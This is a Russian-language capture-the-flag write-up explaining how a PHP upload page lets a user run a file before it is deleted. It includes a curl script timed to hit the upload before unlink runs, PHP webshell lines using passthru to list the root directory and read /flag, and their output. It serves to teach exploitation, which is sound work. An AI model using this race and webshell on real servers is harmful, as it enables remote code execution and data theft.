# Антивирус возвращается: Write-up

В этом таске приложен код на PHP, запускающийся на сервере.

Первое, что привлекает внимание — функция `check_malware`, запускающая какие-то проверки через шелл, передавая имя файла напрямую, но из-за использования `escapeshellarg` уязвимости command injection здесь нет. Алгоритм проверки, конечно, не очень убеждает в пользе антивируса, но что поделать.

Следующее, что привлекает внимание — код заливки файла:

```php
$file_path = "uploads/" . $file_name;
if (!move_uploaded_file($_FILES["malware"]["tmp_name"], $file_path)) {
```

`$file_path` содержит относительный путь, то есть путь относительно скрипта. Такой вызов `move_uploaded_file` приведет к копированию файла в такую папку, что он будет доступен по адресу `https://collateral.q.2023.ugractf.ru/<token>/uploads/<original_file_name>`. Это уже небезопасно — если мы зальем некоторый скрипт на PHP и сделаем запрос на такой путь, сервер, возможно, исполнит залитый скрипт.

Некоторая проблема возникает из-за того, что залитый файл удаляется после проверки:

```php
unlink($file_path);
```

Поэтому сделать запрос на залитый шелл надо успеть во время проверки. К счастью, проверка из-за использования `sleep` занимает как минимум одну секунду, так что устроить такой race condition легко. Это можно попробовать сделать руками, либо, например, написать для этого скрипт на bash, используя curl:

```bash
URL="https://collateral.q.2023.ugractf.ru/<token>"
curl -s "$URL" -F "malware=@exploit.php" >/dev/null & sleep 0.5
curl -s "$URL/uploads/exploit.php"
```

Для проверки эксплоита можно в качестве `exploit.php` залить, например, следующий код:

```php
<?php passthru("ls -la /");
```

```
total 52
drwxr-xr-x    1 root     root           180 Dec 18 09:54 .
drwxr-xr-x    1 root     root           180 Dec 18 09:54 ..
drwxr-xr-x    2 root     root          4096 Nov 11 18:03 bin
drwxr-xr-x    1 root     root           320 Dec 18 09:54 dev
drwxr-xr-x    1 root     root            60 Dec 18 09:54 docker-entrypoint.d
-rwxrwxr-x    1 root     root          1616 Nov 12 06:27 docker-entrypoint.sh
drwxr-xr-x    1 root     root            60 Nov 14 21:29 etc
-rw-r--r--    1 nobody   nobody          60 Dec 18 09:54 flag
drwxr-xr-x    2 root     root          4096 Nov 11 18:03 home
drwxr-xr-x    8 root     root          4096 Nov 14 21:29 lib
drwxr-xr-x    5 root     root          4096 Nov 11 18:03 media
drwxr-xr-x    2 root     root          4096 Nov 11 18:03 mnt
drwxr-xr-x    2 root     root          4096 Nov 11 18:03 opt
dr-xr-xr-x  337 nobody   nobody           0 Dec 18 09:54 proc
drwx------    2 root     root          4096 Nov 11 18:03 root
drwxr-xr-x    1 root     root            60 Dec 18 09:54 run
drwxr-xr-x    2 root     root          4096 Nov 11 18:03 sbin
drwxr-xr-x    2 root     root          4096 Nov 11 18:03 srv
drwxr-xr-x    2 root     root          4096 Nov 11 18:03 sys
drwxrwxrwt    1 root     root            80 Dec 18 10:04 tmp
drwxr-xr-x    7 root     root          4096 Nov 11 18:03 usr
drwxr-xr-x    1 root     root           100 Nov 14 21:29 var
```

...и сразу заметить в корне файл `flag`:

```php
<?php passthru("cat /flag");
```

```
ugra_ever_wondered_who_uses_virustotal_most_huh_dm4t6p023nyc
```

Флаг: **ugra_ever_wondered_who_uses_virustotal_most_huh_dm4t6p023nyc**
